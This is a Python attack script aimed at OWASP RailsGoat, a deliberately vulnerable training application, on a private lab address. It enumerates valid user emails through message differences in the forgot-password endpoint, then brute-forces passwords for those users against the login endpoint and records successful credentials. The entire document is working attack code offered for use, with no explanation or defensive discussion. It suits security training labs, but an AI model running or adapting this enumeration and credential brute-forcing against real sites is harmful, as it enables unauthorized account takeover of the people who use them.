Building a Custom Username Enumeration Script via the Forgot Password Endpoint (OWASP RailsGoat)
import re
import time
import requests

def enumerate_users(
    url, 
    wordlist_path, 
    output_file, 
    headers=None, 
    email_domain="email.com"
):
    """
    Enumerates valid users via forgot password endpoint.
    """

    if headers is None:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": url,
        }

    session = requests.Session()

    # Regex patterns
    success_pattern = re.compile(r"Password reset email sent to ([\w\.-]+@[\w\.-]+)")  # If email exists in application
    failure_pattern = re.compile(r"There was an issue sending password reset email to ([\w\.-]+@[\w\.-]+)")  # If email does not exist in application

    # Load wordlist
    with open(wordlist_path, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]

    total = len(usernames)

    start_time = time.time()
    requests_sent = 0

    valid_user_emails = []

    with open(output_file, "w") as out:
        for i, username in enumerate(usernames, start=1):

            email = f"{username}@{email_domain}"  # Define Email format

            data = {
                "utf8": "✓",
                "authenticity_token": "",  # Populate if required by the app
                "email": email.lower(),
                "commit": "Reset Password"
            }

            try:
                response = session.post(url, headers=headers, data=data)
                requests_sent += 1

                # Progress tracking
                elapsed = time.time() - start_time
                rps = requests_sent / elapsed if elapsed > 0 else 0
                progress = (i / total) * 100
                remaining = total - i
                eta = remaining / rps if rps > 0 else 0

                print(
                    f"\r[Progress] {i}/{total} ({progress:.2f}%) | "
                    f"Time: {elapsed:.1f}s | RPS: {rps:.2f} | ETA: {eta:.1f}s",
                    end=""
                )

                text = response.text

                # Regex checks
                success_match = success_pattern.search(text)
                failure_match = failure_pattern.search(text)

                if success_match:
                    found_email = success_match.group(1)
                    valid_user_emails.append(found_email)

                    print(f"\n[+] VALID USER: {found_email}")
                    out.write(found_email + "\n")

                elif failure_match:
                    pass

            except Exception as e:
                print(f"\nError with {username}: {e}")

    end_time = time.time()
    total_time = end_time - start_time

    print("\n\n--- Finished ---")

    # Email for valid users
    print("\n[+] Successful Emails Found:")
    if valid_user_emails:
        for email in valid_user_emails:
            print(f"   - {email}")
    else:
        print("   None")

    print("\n")

    print(f"Total requests: {requests_sent}")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Average RPS: {requests_sent / total_time:.2f}")


def try_login_from_users(
    login_url,
    valid_users_file="valid_users.txt",
    password_wordlist="/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
    output_file="logged_in.txt"
):

    session = requests.Session()

    success_pattern = re.compile(r"Welcome,\s+(\w+)")

    # Load users
    with open(valid_users_file, "r") as f:
        users = [line.strip() for line in f if line.strip()]

    # Load passwords
    with open(password_wordlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    start_time = time.time()
    requests_sent = 0

    successful_logins = []  # store results

    with open(output_file, "a") as out:

        for user in users:
            print(f"\n[*] Testing user: {user}")

            for password in passwords:

                try:                    
                    data = {
                        "utf8": "✓",
                        "authenticity_token": "",
                        "url": "",
                        "email": user,
                        "password": password,
                        "commit": "Login"
                    }

                    # DEBUG: show outgoing request
                    # print("\n[DEBUG] -----------------------------------")
                    # print(f"[DEBUG] Trying: {user}:{password}")
                    # print(f"[DEBUG] POST -> {login_url}")
                    # print(f"[DEBUG] authenticity_token: '{data['authenticity_token']}'")
                    # print(f"[DEBUG] Full Payload: {data}")

                    # IMPORTANT: disable redirects so you can detect 302
                    response = session.post(login_url, data=data, allow_redirects=False)
                    requests_sent += 1

                    # print(f"[DEBUG] Status Code: {response.status_code}")
                    # print(f"[DEBUG] Location Header: {response.headers.get('Location')}")

                    # DEBUG: show response behavior
                    # print(f"[DEBUG] Response Code: {response.status_code}")
                    # print(f"[DEBUG] Redirect Location: {response.headers.get('Location')}")

                    # Optional: confirm response type
                    if response.status_code != 302:
                        print("[DEBUG] No redirect → likely failed login")

                    # Detect success
                    if response.status_code == 302 and "dashboard" in response.headers.get("Location", ""):
                        result = f"{user}:{password}"
                        print(f"\n[+] LOGIN SUCCESS: {user}:{password}")

                        successful_logins.append(result)   # store
                        out.write(f"{user}:{password}\n")

                        break  # stop trying more passwords for this user

                except Exception as e:
                    print(f"\nError: {e}")

                # Progress tracking
                elapsed = time.time() - start_time
                rps = requests_sent / elapsed if elapsed > 0 else 0

                print(
                    f"\rRequests: {requests_sent} | RPS: {rps:.2f}",
                    end=""
                )

    total_time = time.time() - start_time

    print("\n\n--- Finished ---")

    # Print successful logins summary
    print("\n[+] Successful Logins Found:")
    if successful_logins:
        for login in successful_logins:
            print(f"   - {login}")
    else:
        print("   None")

    print("\n")

    print(f"Total requests: {requests_sent}")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Average RPS: {requests_sent / total_time:.2f}")


if __name__ == "__main__":
    enumerate_users(
        url="http://192.168.56.105/railsgoat/forgot_password",
        wordlist_path="/usr/share/seclists/Usernames/cirt-default-usernames.txt",
        output_file="valid_users.txt"
    )

    try_login_from_users(
        login_url="http://192.168.56.105/railsgoat/sessions"
    )
